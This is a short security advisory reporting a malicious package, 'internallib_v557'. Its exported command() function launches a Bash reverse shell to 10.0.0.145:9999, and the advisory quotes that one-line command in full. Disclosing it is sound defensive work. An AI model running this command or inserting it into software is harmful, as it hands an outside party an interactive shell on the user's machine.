summary: Reverse shell backdoor to 10.0.0.145:9999 in exported command()
details: The package's main module (index.js) exports a function `command()` whose body executes `/bin/bash -c "bash -i >& /dev/tcp/10.0.0.145/9999 0>&1" &` via child_process.exec. This is a classic Bash TCP reverse-shell that connects to 10.0.0.145 on port 9999 and gives the remote endpoint an interactive shell on the installer's machine. Any consumer that requires this package and calls `.command()` is fully compromised. The package ships only a few lines of code, has placeholder-style metadata (`internallib_v557`), and provides no legitimate functionality — the reverse shell is the package's purpose.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
